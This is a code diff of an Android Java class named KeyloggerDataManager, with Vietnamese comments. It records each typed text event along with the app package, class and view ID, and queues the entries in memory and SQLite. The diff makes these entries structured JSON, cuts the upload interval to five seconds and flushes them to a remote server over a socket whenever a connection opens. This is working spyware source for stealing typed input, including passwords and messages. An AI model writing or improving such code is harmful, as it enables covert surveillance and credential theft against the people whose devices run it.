@@ -26,17 +26,21 @@ import java.util.concurrent.ConcurrentLinkedQueue;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicBoolean;
 
 public class KeyloggerDataManager {
 
     private static KeyloggerDataManager instance;
-    private final ConcurrentLinkedQueue<String> memoryBuffer;
+    /** Bộ đệm các keystroke dạng JSONObject (có cấu trúc), không còn là raw string */
+    private final ConcurrentLinkedQueue<JSONObject> memoryBuffer;
     private final ScheduledExecutorService scheduler;
     private final File logFile;
     private final KeystrokeDatabase database;
     private ConnectivityManager.NetworkCallback networkCallback;
+    private final AtomicBoolean socketListenerRegistered = new AtomicBoolean(false);
 
-    private static final int FLUSH_INTERVAL_SECONDS = 15;
+    /** Giảm từ 15s xuống 5s để giảm độ trễ end-to-end */
+    private static final int FLUSH_INTERVAL_SECONDS = 5;
     private static final int MAX_MEMORY_BUFFER = 200;
     private static final int OFFLINE_BATCH_SIZE = 100;
 
@@ -62,41 +66,97 @@ public class KeyloggerDataManager {
         return instance;
     }
 
+    /**
+     * Ghi một keystroke mới: tạo JSONObject có cấu trúc, thêm vào memory buffer.
+     * File write và DB insert được đẩy sang background thread để tránh ANR.
+     */
     public void logEntry(long timestamp, String eventType, String pkg, String cls, String viewId, String text, String extra) {
-        String timeFormatted = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.US).format(new Date(timestamp));
-        String line = "[" + timeFormatted + "][" + eventType + "] pkg=" + pkg
-            + " cls=" + cls + " viewId=" + viewId + " text=" + text + " extra=" + extra;
+        // Bước 1: Tạo JSONObject và thêm vào memory buffer (nhanh, trên calling thread)
+        try {
+            JSONObject entry = new JSONObject();
+            entry.put("ts", timestamp);
+            entry.put("eventType", eventType);
+            entry.put("pkg", pkg != null ? pkg : "");
+            entry.put("cls", cls != null ? cls : "");
+            entry.put("viewId", viewId != null ? viewId : "");
+            entry.put("txt", text != null ? text : "");
+            entry.put("extra", extra != null ? extra : "");
+            memoryBuffer.add(entry);
+        } catch (Exception e) {
+            Log.e("KeyloggerDM", "Failed to create JSON entry", e);
+        }
 
-        memoryBuffer.add(line);
-        appendToFile(line);
+        // Bước 2: File + DB IO được đẩy sang scheduler thread để không block main thread
+        final String safePkg = pkg != null ? pkg : "";
+        final String safeCls = cls != null ? cls : "";
+        final String safeViewId = viewId != null ? viewId : "";
+        final String safeText = text != null ? text : "";
+        final String safeExtra = extra != null ? extra : "";
+        scheduler.execute(() -> {
+            String timeFormatted = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.US).format(new Date(timestamp));
+            String line = "[" + timeFormatted + "][" + eventType + "] pkg=" + safePkg
+                + " cls=" + safeCls + " viewId=" + safeViewId + " text=" + safeText + " extra=" + safeExtra;
+            appendToFile(line);
+            database.insert(timestamp, eventType, safePkg, safeCls, safeViewId, safeText, safeExtra);
+        });
 
-        database.insert(timestamp, eventType, pkg, cls, viewId, text, extra);
-
+        // Nếu buffer đầy, flush ngay (flushToNetwork chạy an toàn trên mọi thread)
         if (memoryBuffer.size() >= MAX_MEMORY_BUFFER) {
             flushToNetwork();
         }
     }
 
+    /**
+     * Bắt đầu network sync định kỳ + lắng nghe sự kiện socket connect để flush ngay.
+     */
     public void startNetworkSync() {
+        // Flush định kỳ
         scheduler.scheduleAtFixedRate(() -> {
             if (!memoryBuffer.isEmpty() || database.getUnsyncedCount() > 0) {
                 flushToNetwork();
             }
         }, FLUSH_INTERVAL_SECONDS, FLUSH_INTERVAL_SECONDS, TimeUnit.SECONDS);
+
+        // Đăng ký listener socket connect (chạy trên scheduler thread, không block main thread)
+        scheduler.execute(() -> {
+            if (!socketListenerRegistered.compareAndSet(false, true)) return;
+            try {
+                io.socket.client.Socket s = SocketClient.getInstance().getSocket();
+                if (s != null) {
+                    s.on(io.socket.client.Socket.EVENT_CONNECT, args -> {
+                        Log.d("KeyloggerDM", "Socket connected — flushing queued keystrokes");
+                        try { Thread.sleep(500); } catch (InterruptedException ignored) {
+                            Thread.currentThread().interrupt();
+                        }
+                        flushToNetwork();
+                    });
+                    Log.d("KeyloggerDM", "Socket connect listener registered");
+                }
+            } catch (Exception e) {
+                Log.d("KeyloggerDM", "Failed to register socket listener: " + e.getMessage());
+            }
+        });
     }
 
+    /**
+     * Flush dữ liệu từ memory buffer (live) và SQLite (offline) lên server.
+     * Live data được gửi dưới dạng JSONArray các object có cấu trúc,
+     * không còn là raw string blob như phiên bản cũ.
+     */
     public void flushToNetwork() {
         if (!isSocketConnected()) {
             Log.d("KeyloggerDM", "Offline — " + database.getUnsyncedCount() + " entries queued");
             return;
         }
 
-        StringBuilder payload = new StringBuilder();
-        String line;
-        while ((line = memoryBuffer.poll()) != null) {
-            payload.append(line).append("\n");
+        // Drain memory buffer → JSONArray các object có cấu trúc
+        JSONArray liveArray = new JSONArray();
+        JSONObject entry;
+        while ((entry = memoryBuffer.poll()) != null) {
+            liveArray.put(entry);
         }
 
+        // Lấy unsynced rows từ SQLite
         List<JSONObject> unsynced = database.getUnsynced(OFFLINE_BATCH_SIZE);
         List<Long> syncedIds = new ArrayList<>();
         JSONArray offlineBatch = new JSONArray();
@@ -108,9 +168,12 @@ public class KeyloggerDataManager {
             } catch (Exception ignored) {}
         }
 
+        // Không có gì để gửi
+        if (liveArray.length() == 0 && offlineBatch.length() == 0) return;
+
         try {
             JSONObject json = new JSONObject();
-            json.put("live", payload.toString());
+            json.put("live", liveArray);
             json.put("offlineBatch", offlineBatch);
             json.put("offlineCount", unsynced.size());
             json.put("totalQueued", database.getUnsyncedCount());
@@ -123,7 +186,7 @@ public class KeyloggerDataManager {
                 if (!syncedIds.isEmpty()) {
                     database.markSynced(syncedIds);
                 }
-                Log.d("KeyloggerDM", "Flushed " + payload.length() + " live + " + unsynced.size() + " offline entries");
+                Log.d("KeyloggerDM", "Flushed " + liveArray.length() + " live + " + unsynced.size() + " offline entries");
             }
         } catch (Exception e) {
             Log.e("KeyloggerDM", "Socket send failed", e);
